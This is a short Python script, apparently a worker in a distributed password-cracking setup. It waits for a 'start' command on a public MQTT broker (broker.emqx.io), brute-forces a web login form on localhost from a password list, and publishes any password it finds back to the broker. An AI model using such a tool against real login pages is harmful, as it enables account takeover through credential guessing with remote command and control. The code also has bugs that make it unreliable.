import paho.mqtt.client as mqtt
import mechanize

br = mechanize.Browser()


def crackPassword():
    br.open(uri)
    for i in range(len(passs)):
        br.select_form(name='from')
        br['pass'] = passs[i]
        responsee = br.submit()
        if ('succes' in responsee.geturl()):
            return(passs[i] + ' current URL : ' + responsee.geturl())


def on_message(client, userdata, message):
    global msg
    msg = str(message.payload.decode("utf-8"))


global msg
msg = ''

passs = ['bababuwi', 'bababuwi', 'bababuwi',
         'bababuwi', 'bababuwi', 'bababuwi']

addr, port, uri = 'broker.emqx.io', 1883, 'http://localhost'

client = mqtt.Client('Worker')
client.on_message = on_message
client.connect(addr, port)

while True:
    client.loop_start()
    client.subscribe('topic/hack')
    client.loop_stop()

    if (msg == 'start'):
        try:
            result = crackPassword()
        except:
            client.publish('topic/worker/result', 'Failed')
            break
        if ('succes' in result):
            client.publish('topic/worker/result',
                           'Success, password is ' + result)
            break
        else:
            print(result)
            client.publish('topic/worker/result',
                           'Failed, Password not found in worker')
            break
